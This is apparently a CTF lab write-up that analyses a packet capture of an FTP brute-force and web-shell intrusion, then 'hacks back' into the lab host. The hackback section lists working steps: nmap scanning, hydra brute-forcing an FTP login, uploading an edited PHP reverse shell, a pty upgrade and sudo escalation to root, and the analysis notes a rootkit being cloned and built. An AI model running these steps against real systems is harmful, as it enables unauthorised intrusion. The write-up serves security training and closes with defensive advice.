
```
we got a .pcap related to a supposed incident  
we will use wireshark to analyze the traffic and find out what happened
```

# Analysis

as most of this was boring, I will include only some interesting parts

**interesting filters**

we found out that the attacker used hydra to bruteforce user `jenny`'s FTP password (password123 was successful) and 

`ftp && ftp && ftp.command`
 - helps us find out which commands were sent over FTP
 - a lot of the FTP packets did not have commands, so this helped a lot

what happened and what it probably means:
 - the attacker first ran `SYST` and `PWD` to gain info about which exploit to use
 - in `/var/www/html` he uploaded shell.php with `STOR shell.php`
 - then ran `SITE CHMOD 777 shell.php` to make it executable and `QUIT`

packet 450:
```
GET /shell.php HTTP/1.1
Source: 192.168.0.147
Destination: 192.168.0.115
```

packet 493, if we follow TCP stream we can see how the attacker used the shell to get from www-data to jenny to root (Jenny had very insane permissions)

```bash
jenny@wir3:/$ sudo -l
User jenny may run the following commands on wir3:
    (ALL : ALL) ALL
jenny@wir3:/$ sudo su
root@wir3:/# git clone https://github.com/f0rb1dd3n/Reptile.git
...
root@wir3:~# cd Reptile && make
```

frame contains "string"
 - find packets where string is in payload

we need to search for from where the shell can be downloaded from

`tcp and frame contains "http://" or frame contains "https://"`

we can see they used pentestmonkey's php rev shell (found a link to hxxp://pentestmonkey.net/tools/php-reverse-shell)

# Hackback

we were tasked to hack back into the machine

sudo nmap -sS -p- 10.114.134.188 -T4

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

hydra -l jenny -P ~/wordlists/rockyou.txt 10.114.134.188 ftp

we got 987654321

then we `mget shell.php` and edited it to connect back to us

after `put shell.php` we  accessed it on the web server by accessing `http://10.114.134.188/shell.php`

we got a connection, but have to upgrade to run sudo su, so

python3 -c 'import pty; pty.spawn("/bin/bash")'

su jenny

we confirm with `sudo -l` that we still can `sudo su`

and we are root

```bash
jenny@ip-10-114-134-188:/home$ sudo su
sudo su
root@ip-10-114-134-188:/home# id
id
uid=0(root) gid=0(root) groups=0(root)
```

ggs, very fun and simple wireshark refreshment

# How to prevent this?

- avoid common passwords, ideally use MFA
- do not give users infinite permissions
- rate limit login attempts, report multiple failed attempts to catch incidents early
- do not allow users to upload executable files to web servers (whitelist needed file extensions)
- IP whitelisting, firewalls and VPNs to prevent unrestricted external access